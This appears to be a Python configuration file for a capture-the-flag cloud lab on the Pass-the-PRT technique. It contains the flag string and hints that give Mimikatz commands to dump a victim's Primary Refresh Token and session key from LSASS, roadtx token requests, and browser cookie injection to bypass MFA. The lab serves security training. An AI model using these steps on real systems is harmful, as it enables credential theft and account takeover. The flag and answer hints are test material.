from cumulonimbus.providers.base.application_configuration import ApplicationConfigurationAbstract


class ApplicationConfiguration(ApplicationConfigurationAbstract):

    def get_flag(self) -> str:
        return "CUMULONIMBUS{PassThePRT_CloudLateralMovement_MFA_Bypass}"
    def get_hints(self) -> dict:
        return {
            1: "The victim user's PRT is stored in LSASS under their CloudAP credential entry — not visible via dsregcmd (which only shows the current user's state). Mimikatz is pre-installed at C:\\Tools\\mimikatz\\x64\\mimikatz.exe. Open it as Administrator and run: privilege::debug then sekurlsa::cloudap. Look for an entry whose KeyValue / PRT fields are populated.",
            2: "In Mimikatz (run as Administrator): `privilege::debug` then `sekurlsa::cloudap`. Copy the PRT value and the ProofOfPossessionKey blob. Next: `token::elevate` then `dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect` to decrypt the session key. The output shows both a `Clear key` and a `Derived Key` — they are different values. Save Context, Clear key, and Derived Key.",
            3: "Two paths: (1) roadtx — use the Clear key: `roadtx prtauth --prt <PRT> --prt-sessionkey <Clear_key> --resource https://vault.azure.net/`, then read the flag with the token saved to .roadtools_auth. (2) Browser cookie — use the Derived Key: `dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /prt:<PRT>`, inject cookie `x-ms-RefreshTokenCredential` on login.microsoftonline.com (HttpOnly+Secure), enter the victim UPN when prompted.",
        }

    mitre_ttps = [
        {"id": "T1550.001", "name": "Use Alternate Authentication Material: Application Access Token", "url": "https://attack.mitre.org/techniques/T1550/001/"},
        {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts", "url": "https://attack.mitre.org/techniques/T1078/004/"},
        {"id": "T1528", "name": "Steal Application Access Token", "url": "https://attack.mitre.org/techniques/T1528/"},
    ]

    def configure_application(self, **kwargs):
        pass

    def pretty_print_tf_output(self, app_id, output):
        print("###############################################")
        print("#             Required Information            #")
        print("###############################################")
        print(f"  VM public IP        : {output.get('vm_public_ip', {}).get('value', 'N/A')}")
        print(f"  Local admin user    : {output.get('attacker_username', {}).get('value', 'N/A')}")
        print(f"  Local admin password: {output.get('attacker_password', {}).get('value', 'N/A')}")
        print(f"  Key Vault name      : {output.get('keyvault_name', {}).get('value', 'N/A')}")
        print(f"  Key Vault URI       : {output.get('keyvault_uri', {}).get('value', 'N/A')}")
        print(f"  Resource group      : {output.get('resource_group', {}).get('value', 'N/A')}")
        ip = output.get('vm_public_ip', {}).get('value', '<ip>')
        pw = output.get('attacker_password', {}).get('value', '<attacker_password>')
        print(f"\nWait ~10 min after deploy (autologon seeds the victim's PRT on first boot), then RDP as local admin:")
        print(f"  xfreerdp3 /v:{ip} /u:attacker /p:{pw} /d:. /cert:ignore")
        print(f"Goal  : Extract the victim's PRT with Mimikatz, forge a browser cookie, read the Key Vault flag.")
        self.print_mitre_ttps()
